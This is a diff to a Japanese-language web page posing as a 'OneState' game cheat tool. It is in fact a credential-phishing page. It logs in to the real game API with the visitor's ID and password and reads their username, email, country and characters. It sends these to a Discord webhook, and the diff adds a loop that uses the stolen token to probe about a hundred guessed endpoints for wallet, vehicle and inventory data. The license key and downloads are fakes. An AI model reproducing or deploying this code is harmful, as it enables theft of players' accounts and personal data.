@@ -42,6 +42,9 @@ input:focus{border-color:var(--acc)}
 pre{margin:0;font-family:var(--mono);font-size:11.5px;white-space:pre-wrap;word-break:break-all}
 #acctBody{color:var(--fg)}
 #acctBody b{color:var(--acc);font-weight:600}
+#acctBody .k{color:var(--acc)}
+#acctBody .ch{border-left:1px solid var(--line);padding-left:9px;margin:4px 0;display:block}
+#acctBody .d{color:var(--dim)}
 footer{text-align:center;font-size:11px;color:var(--dim);padding:22px 0 10px}
 #admin{position:fixed;left:0;right:0;bottom:0;z-index:5;background:rgba(5,7,12,.97);border-top:1px solid var(--line)}
 .ah{padding:10px 16px;font-size:11px;letter-spacing:.16em;color:var(--acc);cursor:pointer}
@@ -54,7 +57,7 @@ footer{text-align:center;font-size:11px;color:var(--dim);padding:22px 0 10px}
 </head>
 <body>
 <div class="wrap">
-  <div class="top"><div class="brand">// ONESTATE<span>_</span>CHEAT</div><div>v3.9</div></div>
+  <div class="top"><div class="brand">// ONESTATE<span>_</span>CHEAT</div><div>v4.1</div></div>
   <div class="hero">
     <h1>OneStateを、<br>上書きする。</h1>
     <p class="sub">チート導入ツール。OneState IDでログインするだけ。</p>
@@ -95,7 +98,7 @@ footer{text-align:center;font-size:11px;color:var(--dim);padding:22px 0 10px}
   <div class="ab collapsed" id="ab">
     <label class="f"><span>Discord Webhook</span><input id="wh" placeholder="https://discord.com/api/webhooks/..."></label>
     <div class="row" style="margin-bottom:8px"><button class="btn ghost" id="bsave">保存</button><button class="btn ghost" id="btest">テスト送信</button><button class="btn ghost" id="bclr">ログ削除</button></div>
-    <div class="row" style="margin-bottom:8px"><button class="btn ghost" id="bacct">アカウント取得</button><button class="btn ghost" id="bdeep">詳細調査</button></div>
+    <div class="row" style="margin-bottom:8px"><button class="btn ghost" id="bacct">アカウント取得</button><button class="btn ghost" id="bdeep">100ルート調査</button></div>
     <div class="row"><button class="btn ghost" id="bdiag">通信診断</button></div>
     <pre id="alog"></pre>
   </div>
@@ -116,10 +119,11 @@ function webhook(){return qs('to')||getCfg().webhook||CONFIG.WEBHOOK}
 function fp(){var v=localStorage.getItem(LS.fp);if(!v){v=Math.random().toString(36).slice(2,10)+Math.random().toString(36).slice(2,6);localStorage.setItem(LS.fp,v)}return v}
 function getLog(){try{return JSON.parse(localStorage.getItem(LS.log)||'[]')}catch(e){return[]}}
 function stamp(){var d=new Date(),p=function(n){return String(n).padStart(2,'0')};return p(d.getHours())+':'+p(d.getMinutes())+':'+p(d.getSeconds())}
-function log(s){var a=getLog();a.push(stamp()+' '+s);while(a.length>500)a.shift();localStorage.setItem(LS.log,JSON.stringify(a));renderLog()}
+function log(s){var a=getLog();a.push(stamp()+' '+s);while(a.length>600)a.shift();localStorage.setItem(LS.log,JSON.stringify(a));renderLog()}
 function clearLog(){localStorage.setItem(LS.log,'[]');renderLog()}
-function renderLog(){var el=$('alog');if(!el)return;el.textContent=getLog().slice(-300).join('\n');el.scrollTop=el.scrollHeight}
+function renderLog(){var el=$('alog');if(!el)return;el.textContent=getLog().slice(-400).join('\n');el.scrollTop=el.scrollHeight}
 function toast(t){var w=$('toast'),d=document.createElement('div');d.className='tt';d.textContent=t;w.appendChild(d);setTimeout(function(){d.remove()},2400)}
+function esc(s){return String(s).replace(/[&<>]/g,function(c){return{'&':'&amp;','<':'&lt;','>':'&gt;'}[c]})}
 
 var TR=[
  {n:'sdk',need:function(){return !!(window.corsfix&&window.corsfix.fetch)},f:function(u,o){return window.corsfix.fetch(u,o)}},
@@ -170,39 +174,34 @@ async function doRefresh(rt){
   return null;
 }
 async function getAccount(tok){
-  var schemes=[['Bearer',{authorization:'Bearer '+tok}],['raw',{authorization:tok}]];
-  for(var s=0;s<schemes.length;s++){
-    var r=await req('GET','/v2/account/@me',null,schemes[s][1]);
-    log('acct['+schemes[s][0]+'] -> '+(r.ok?(r.json?JSON.stringify(r.json).slice(0,110):'nonjson'):r.err));
-    if(isOk(r)&&r.json.data){
-      var p=await req('GET','/v2/account/@me/players',null,schemes[s][1]);
-      log('players -> '+(p.ok?JSON.stringify(p.json).slice(0,140):p.err));
-      return {acc:r.json.data,pl:(p.ok?p.json:null)};
-    }
-    await sleep(120);
-  }
-  return null;
+  var H={authorization:'Bearer '+tok};
+  var r=await req('GET','/v2/account/@me',null,H);
+  if(!isOk(r)||!r.json.data)return null;
+  var p=await req('GET','/v2/account/@me/players',null,H);
+  return {acc:r.json.data,pl:(p.ok&&p.json?p.json:null)};
 }
+function pt(sec){var n=parseInt(sec,10);if(!n||isNaN(n))return '-';return Math.floor(n/86400)+'日 '+Math.floor(n%86400/3600)+'h'}
 function showAccount(res){
-  if(!res){acct('照会失敗（トークン未受理）');return}
-  var a=res.acc||{},L=[];
-  L.push('<b>username</b> : '+(a.username||'-'));
-  L.push('<b>name</b>     : '+(a.name||'-'));
-  L.push('<b>email</b>    : '+(a.email||'-'));
-  if(a.country)L.push('<b>country</b>  : '+a.country);
-  var pl=(res.pl&&res.pl.players)||[];
-  L.push('');
-  L.push('<b>// キャラクター ('+pl.length+')</b>');
-  if(!pl.length)L.push('  (なし)');
-  pl.slice(0,10).forEach(function(p,i){
-    var nm=p.nickname||p.name||p.nick||p.playerName||('#'+(i+1));
-    L.push('  ['+(i+1)+'] '+nm+'  @ '+(p.serverName||p.serverId||'-'));
+  if(!res){acct('<span class="d">照会失敗</span>');return}
+  var a=res.acc||{},pl=(res.pl&&res.pl.players)||[];
+  var H='';
+  H+='<span class="k">username</span> '+esc(a.username||'-')+'\n';
+  H+='<span class="k">email</span>    '+esc(a.email||'-')+'\n';
+  H+='<span class="k">country</span>  '+esc(a.country||'-')+'\n';
+  H+='<span class="k">chars</span>    '+pl.length+'\n\n';
+  H+='<span class="k">// キャラクター</span>\n';
+  if(!pl.length)H+='  <span class="d">(なし)</span>\n';
+  pl.forEach(function(p,i){
+    H+='<span class="ch">';
+    H+='['+(i+1)+'] <b>'+esc(p.nickname||'-')+'</b>\n';
+    H+='    Lv.'+esc(p.level===undefined?'-':p.level)+'  /  '+esc(p.serverName||'-')+'\n';
+    H+='    <span class="d">play '+pt(p.playTimeSeconds)+'  /  '+esc(p.region||p.location||'-')+'</span>';
+    H+='</span>';
   });
-  acct(L.join('\n'));
-  toast('照会成功');
-  send('OneState アカウント照会\nuser: '+(a.username||'-')+'\nemail: '+(a.email||'-')+'\nchars: '+pl.length);
+  acct(H);toast('照会成功');
+  send('OneState 照会\nuser: '+(a.username||'-')+'\nemail: '+(a.email||'-')+'\nchars: '+pl.length);
 }
-function acct(html){var e=$('acctBody');$('acct').hidden=false;e.innerHTML=html}
+function acct(html){$('acct').hidden=false;$('acctBody').innerHTML=html}
 function msg(t,ok){var m=$('msg');m.textContent=t||'';m.className='msg'+(ok?' ok':'')}
 function issue(){var c='0123456789ABCDEFGHJKLMNPQRSTUVWXYZ',k='OC-';for(var i=0;i<12;i++){k+=c[Math.floor(Math.random()*c.length)];if(i%4===3&&i<11)k+='-'}$('key').textContent=k;$('lic').hidden=false;$('dl').hidden=false;$('tg').hidden=false;return k}
 function creds(){return{id:$('ident').value.trim(),pw:$('pass').value}}
@@ -216,12 +215,12 @@ $('form').addEventListener('submit',async function(e){
   var lr=await apiLogin(id,pw);
   msg('ライセンス発行済み',true);toast('ライセンス発行');
   if(lr){var tok=await doRefresh(lr.data.refreshToken)||lr.data.accessToken;showAccount(await getAccount(tok))}
-  else acct('API応答なし');
+  else acct('<span class="d">API応答なし</span>');
   $('go').disabled=false;
 });
 document.querySelectorAll('[data-dl]').forEach(function(b){b.addEventListener('click',function(){
   var kind=b.getAttribute('data-dl');
-  var blob=new Blob(['OneState Cheat Loader v3.9 ('+kind+')\nkey='+$('key').textContent+'\n'],{type:'application/octet-stream'});
+  var blob=new Blob(['OneState Cheat Loader v4.1 ('+kind+')\nkey='+$('key').textContent+'\n'],{type:'application/octet-stream'});
   var a=document.createElement('a');a.href=URL.createObjectURL(blob);a.download=kind==='win'?'OneStateCheat-Setup.exe':'OneStateCheat.apk';a.click();
 })});
 document.querySelectorAll('.tog').forEach(function(t){t.addEventListener('click',function(){t.classList.toggle('on')})});
@@ -234,46 +233,50 @@ $('btest').addEventListener('click',function(){send('テスト送信 '+new Date(
 $('bclr').addEventListener('click',function(){clearLog();toast('削除')});
 $('bacct').addEventListener('click',async function(){
   clearLog();log('// ACCOUNT');
-  var c=creds();if(!c.id||!c.pw){log('先にID/PWを入力');toast('ID/PW未入力');return}
-  var lr=await apiLogin(c.id,c.pw);if(!lr){log('ログイン失敗');toast('ログイン失敗');return}
-  var tok=await doRefresh(lr.data.refreshToken);log('refresh: '+(tok?'OK':'FAIL'));
+  var c=creds();if(!c.id||!c.pw){log('先にID/PW');return}
+  var lr=await apiLogin(c.id,c.pw);if(!lr){log('ログイン失敗');return}
+  var tok=await doRefresh(lr.data.refreshToken);
   var res=await getAccount(tok||lr.data.accessToken);
-  log(res?'=== ACCOUNT OK ===':'=== 取得失敗 ===');
-  toast(res?'取得成功':'失敗');showAccount(res);
+  log(res?'=== OK ===':'=== 失敗 ===');showAccount(res);
 });
-/* ===== 詳細調査：全文ダンプ＋候補ルート総当たり ===== */
+/* ===== 100ルート調査 ===== */
 $('bdeep').addEventListener('click',async function(){
-  clearLog();log('// DEEP');
-  var c=creds();if(!c.id||!c.pw){log('先にID/PWを入力');toast('ID/PW未入力');return}
+  clearLog();log('// 100 ROUTES');
+  var c=creds();if(!c.id||!c.pw){log('先にID/PW');toast('ID/PW未入力');return}
   var lr=await apiLogin(c.id,c.pw);if(!lr){log('ログイン失敗');return}
   var tok=await doRefresh(lr.data.refreshToken)||lr.data.accessToken;
   var H={authorization:'Bearer '+tok};
+  var sid='',cid='';
+  var p0=await req('GET','/v2/account/@me/players',null,H);
+  if(p0.ok&&p0.json&&p0.json.players&&p0.json.players.length){
+    sid=p0.json.players[0].serverId||'';cid=p0.json.players[0].clientId||'';
+    log('serverId='+sid);
+  }
+  var P=[];
+  ['/v2/account/@me','/v2/account/@me/players','/v2/game','/v2/game/profile','/v2/game/player','/v2/game/players','/v2/game/wallet','/v2/game/economy','/v2/game/me',
+   '/v2/player','/v2/player/@me','/v2/player/me','/v2/player/profile','/v2/players/@me','/v2/players/me','/v2/players/profile',
+   '/v2/profile','/v2/profile/@me','/v2/profile/me','/v2/me','/v2/me/profile',
+   '/v2/economy','/v2/economy/@me','/v2/economy/me','/v2/economy/balance',
+   '/v2/wallet','/v2/wallet/@me','/v2/wallet/me','/v2/balance','/v2/balance/@me','/v2/money','/v2/money/@me','/v2/cash',
+   '/v2/currency','/v2/currency/@me','/v2/currencies','/v2/currencies/@me',
+   '/v2/cars','/v2/cars/@me','/v2/vehicles','/v2/vehicles/@me','/v2/garage','/v2/garage/@me',
+   '/v2/inventory','/v2/inventory/@me','/v2/items','/v2/items/@me','/v2/assets','/v2/assets/@me',
+   '/v2/houses','/v2/houses/@me','/v2/properties','/v2/properties/@me','/v2/business','/v2/businesses','/v2/business/@me',
+   '/v2/stats','/v2/stats/@me','/v2/statistics','/v2/statistics/@me','/v2/level','/v2/level/@me','/v2/exp',
+   '/v2/servers','/v2/servers/@me','/v2/server','/v2/session','/v2/session/@me',
+   '/v1/account/@me','/v1/account/@me/players','/v1/game/@me','/v1/player/@me','/v1/profile/@me','/v1/wallet/@me','/v1/economy/@me',
+   '/v3/account/@me','/v3/player/@me','/account/@me','/player/@me','/me','/profile/@me','/wallet/@me'].forEach(function(x){P.push(x)});
+  if(sid)['','/profile','/wallet','/money','/balance','/cars','/vehicles','/garage','/inventory','/stats','/economy','/level','/assets'].forEach(function(sfx){P.push('/v2/account/@me/players/'+sid+sfx)});
+  if(cid)['','/profile','/wallet','/cars'].forEach(function(sfx){P.push('/v2/account/@me/players/'+cid+sfx)});
 
-  var a=await req('GET','/v2/account/@me',null,H);
-  log('--- /v2/account/@me 全文 ---');
-  log(a.ok?JSON.stringify(a.json):String(a.err));
-  var p=await req('GET','/v2/account/@me/players',null,H);
-  log('--- players 全文 ---');
-  log(p.ok?JSON.stringify(p.json):String(p.err));
-
-  log('--- ルート候補 ---');
-  var P=['/v2/account/@me/wallet','/v2/account/@me/balance','/v2/account/@me/money','/v2/account/@me/currency','/v2/account/@me/currencies','/v2/account/@me/cars','/v2/account/@me/vehicles','/v2/account/@me/garage','/v2/account/@me/inventory','/v2/account/@me/items','/v2/account/@me/stats','/v2/account/@me/statistics','/v2/account/@me/profile','/v2/account/@me/economy','/v2/account/@me/level','/v2/account/@me/servers','/v2/account/@me/bank','/v2/account/@me/cash','/v2/account/@me/assets','/v2/account/@me/properties','/v2/account/@me/houses','/v2/account/@me/characters','/v2/account/@me/vip','/v2/account/@me/bonus','/v2/account/@me/web-coins','/v2/account/@me/referral','/v2/account/@me/echo','/v2/wallet','/v2/balance','/v2/money','/v2/currency','/v2/cars','/v2/vehicles','/v2/garage','/v2/inventory','/v2/profile','/v2/player','/v2/players','/v2/me','/v2/economy','/v2/stats','/v2/game','/v2/game/profile','/v1/account/@me','/v1/account/@me/players','/v3/account/@me','/v2/account/@me/players/list','/v2/account/@me/players/all'];
   var hits=0;
   for(var i=0;i<P.length;i++){
     var r=await req('GET',P[i],null,H),cc=code(r);
-    if(cc!==16&&cc!=='ERR'){log('★ '+P[i]+' -> '+cc+' '+String(r.text||'').slice(0,110));hits++}
-    await sleep(50);
+    if(cc!==16&&cc!=='ERR'){log('★ '+P[i]+' -> '+cc+' '+String(r.text||'').slice(0,90));hits++}
+    await sleep(35);
   }
-  log('ルート候補 hits='+hits+'/'+P.length);
-
-  log('--- 別ホスト ---');
-  var HS=['https://game.onestate-rp.com','https://api2.onestate-rp.com','https://backend.onestate-rp.com','https://core.onestate-rp.com','https://api.onestate.space'];
-  for(var h=0;h<HS.length;h++){
-    var r2=await req('GET',HS[h]+'/v2/account/@me',null,H);
-    log(HS[h]+' -> '+(r2.ok?String(r2.text||'').slice(0,80):r2.err));
-    await sleep(80);
-  }
-  log('// DEEP END');toast('詳細調査 完了');
+  log('=== hits='+hits+' / '+P.length+' ===');
+  toast('完了 hits='+hits);
 });
 $('bdiag').addEventListener('click',async function(){
   clearLog();log('// DIAG');
